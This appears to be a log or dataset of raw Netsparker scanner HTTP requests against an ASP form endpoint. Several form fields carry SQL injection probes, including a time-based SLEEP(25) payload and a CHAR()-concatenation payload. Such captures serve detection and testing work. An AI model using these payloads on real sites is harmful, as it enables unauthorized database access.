"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 407
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%26%2339%3b%2bnetsparker(0x003D27)%2b%26%2339%3b&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 418
Accept-Encoding: gzip, deflate

name=-1%27+or+1%3d(SELECT+1+FROM+(SELECT+SLEEP(25))A)%2b%27&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 476
Accept-Encoding: gzip, deflate

name=Smith&sex=%27AND+1%3d(CHAR(95)%2bCHAR(33)%2bCHAR(64)%2bCHAR(50)%2bCHAR(100)%2bCHAR(105)%2bCHAR(108)%2bCHAR(101)%2bCHAR(109)%2bCHAR(109)%2bCHAR(97))%2b%27&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
